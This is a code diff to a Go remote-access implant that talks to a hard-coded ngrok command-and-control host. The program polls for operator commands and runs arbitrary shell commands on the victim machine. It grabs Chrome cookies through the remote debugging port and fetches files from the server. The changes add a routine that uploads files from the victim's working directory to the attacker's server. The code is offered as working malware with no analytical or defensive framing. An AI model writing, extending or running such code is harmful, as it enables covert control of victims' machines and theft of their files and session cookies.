@@ -9,11 +9,13 @@ import (
 	"io/ioutil"
 	"log"
 	"math"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -66,18 +68,16 @@ type Cmd struct {
 var timeoutSetting = 1
 var c2 = "https://e49a4a48f45d.ngrok.io"
 
-//var agent = "test"
-
 func main() {
 	uuid := shortuuid.New()
 	user, err := user.Current()
 	agent := uuid + "_" + user.Uid + "_" + user.Name
 	for {
-		time.Sleep(3 * time.Second)
 		status := createAgent(agent)
 		if status == "200 OK" {
 			break
 		}
+		time.Sleep(3 * time.Second)
 	}
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
@@ -91,7 +91,7 @@ func main() {
 			if err != nil {
 				fmt.Fprintln(os.Stderr, err)
 			}
-			getJSON(c2 + "/api/cmds/" + agent)
+			getCMDs(c2 + "/api/cmds/" + agent)
 			updateAgentStatus(agent)
 		case <-quit:
 			return
@@ -99,9 +99,15 @@ func main() {
 	}
 }
 
-func getJSON(url string) {
+func getCMDs(url string) {
 
 	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Println("err:", err)
+		return
+	}
+	defer resp.Body.Close()
+
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -121,13 +127,9 @@ func getJSON(url string) {
 	}
 
 	for _, d := range results {
-		//fmt.Println(d.Command)
 		fmt.Println(d.Cmdid)
 		runCommand(d.Command, d.Cmdid)
 	}
-
-	// Print the HTTP response status.
-	//fmt.Println("Response status:", resp.Status)
 
 }
 
@@ -161,19 +163,63 @@ func runCommand(commandStr string, cmdid string) error {
 		execScript(cmdid, "/tmp/grabCookies.js")
 		time.Sleep(5 * time.Second)
 		getChromeWSS("http://127.0.0.1:9222/json")
+		updateCmdStatus(cmdid, "Cookies: /tmp/dat2")
+		return nil
+	case "upload":
+		if len(arrCommandStr) < 1 {
+			return errors.New("Requires file path")
+		}
+		fmt.Println(arrCommandStr[1])
+		downloadFile("/tmp/"+arrCommandStr[1], c2+"/files/"+arrCommandStr[1])
+		updateCmdStatus(cmdid, "Location: "+arrCommandStr[1])
+		return nil
 	case "download":
+		if len(arrCommandStr) < 1 {
+			return errors.New("Requires file path")
+		}
 		fmt.Println("Downloading file")
-	default:
-		out, err := exec.Command(arrCommandStr[0], arrCommandStr[1:]...).Output()
+
+		path, _ := os.Getwd()
+		path += "/" + arrCommandStr[1]
+		//file := arrCommandStr[1]
+		extraParams := map[string]string{
+			"operator": "none",
+		}
+		request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
 		if err != nil {
-			fmt.Println(err)
-			updateCmdStatus(cmdid, err.Error())
+			log.Fatal(err)
+		}
+		client := &http.Client{}
+		resp, err := client.Do(request)
+		if err != nil {
+			log.Fatal(err)
+		} else {
+			body := &bytes.Buffer{}
+			_, err := body.ReadFrom(resp.Body)
+			if err != nil {
+				log.Fatal(err)
+			}
+			resp.Body.Close()
+			fmt.Println(resp.StatusCode)
+			fmt.Println(resp.Header)
+			fmt.Println(body)
+		}
+
+		updateCmdStatus(cmdid, "Location: "+path)
+		return nil
+	default:
+		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
+		var out bytes.Buffer
+		var stderr bytes.Buffer
+		cmd.Stdout = &out
+		cmd.Stderr = &stderr
+		err := cmd.Run()
+		if err != nil {
+			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
+			updateCmdStatus(cmdid, fmt.Sprint(err)+": "+stderr.String())
 			return nil
 		}
-		//cmd.Stderr = os.Stderr
-		//cmd.Stdout = os.Stdout
-		//fmt.Println(string(out))
-		updateCmdStatus(cmdid, string(out))
+		updateCmdStatus(cmdid, out.String())
 		return nil
 	}
 	return nil
@@ -182,6 +228,12 @@ func runCommand(commandStr string, cmdid string) error {
 func updateCmdStatus(cmdid string, output string) {
 	resp, err := http.PostForm(c2+"/api/cmd/update",
 		url.Values{"id": {cmdid}, "output": {output}})
+
+	if err != nil {
+		fmt.Println("err:", err)
+		return
+	}
+	defer resp.Body.Close()
 
 	if err != nil {
 		fmt.Println(err)
@@ -202,6 +254,11 @@ func updateAgentStatus(agent string) {
 	fnames := strings.Join(names, ",")
 	resp, err := http.PostForm(c2+"/api/agent/update",
 		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}, "checkIn": {timestamp}})
+	if err != nil {
+		fmt.Println("err:", err)
+		return
+	}
+	defer resp.Body.Close()
 
 	if err != nil {
 		fmt.Println(err)
@@ -219,18 +276,22 @@ func createAgent(agent string) string {
 		names = append(names, f.Name())
 	}
 	fnames := strings.Join(names, ",")
-	fmt.Println("Files: " + fnames)
+	//fmt.Println("Files: " + fnames)
 	resp, err := http.PostForm(c2+"/api/agent/create",
 		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}})
 
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("err:", err)
+		return "500"
 	}
+	defer resp.Body.Close()
 	if resp.Body != nil {
 		defer resp.Body.Close()
 	}
-	fmt.Println(resp.Status)
+
+	//fmt.Println(resp.Status)
 	return resp.Status
+
 }
 
 func downloadFile(filepath string, url string) error {
@@ -238,6 +299,7 @@ func downloadFile(filepath string, url string) error {
 	// Get the data
 	resp, err := http.Get(url)
 	if err != nil {
+		fmt.Println("err:", err)
 		return err
 	}
 	defer resp.Body.Close()
@@ -300,7 +362,7 @@ func execScript(cmdid string, path string) string {
 	cmd.Run()
 	//fmt.Println("Result: " + out.String())
 	updateCmdStatus(cmdid, stderr.String())
-	return ""
+	return stderr.String()
 
 }
 
@@ -309,6 +371,7 @@ func websox(addr string) {
 	c, _, err := websocket.DefaultDialer.Dial(addr, nil)
 	if err != nil {
 		fmt.Println(err)
+		return
 	}
 	defer c.Close()
 
@@ -382,12 +445,15 @@ func killChrome() {
 	cmd.Run()
 }
 
-func getChromeWSS(url string) string {
+func getChromeWSS(url string) {
 
 	resp, err := http.Get(url)
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("err:", err)
+		return
 	}
+	defer resp.Body.Close()
+
 	if resp.Body != nil {
 		defer resp.Body.Close()
 	}
@@ -407,9 +473,38 @@ func getChromeWSS(url string) string {
 		if strings.Contains(d.Type, "page") {
 			fmt.Println("-----")
 			fmt.Println("Page Title: " + d.Title)
-			websox(d.WebSocketDebuggerURL)
+			//websox(d.WebSocketDebuggerURL)
 			fmt.Println("-----")
 		}
 	}
-	return "False"
+
+}
+
+// Creates a new file upload http request with optional extra params
+func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
+	if err != nil {
+		return nil, err
+	}
+	_, err = io.Copy(part, file)
+
+	for key, val := range params {
+		_ = writer.WriteField(key, val)
+	}
+	err = writer.Close()
+	if err != nil {
+		return nil, err
+	}
+
+	req, err := http.NewRequest("POST", uri, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	return req, err
 }
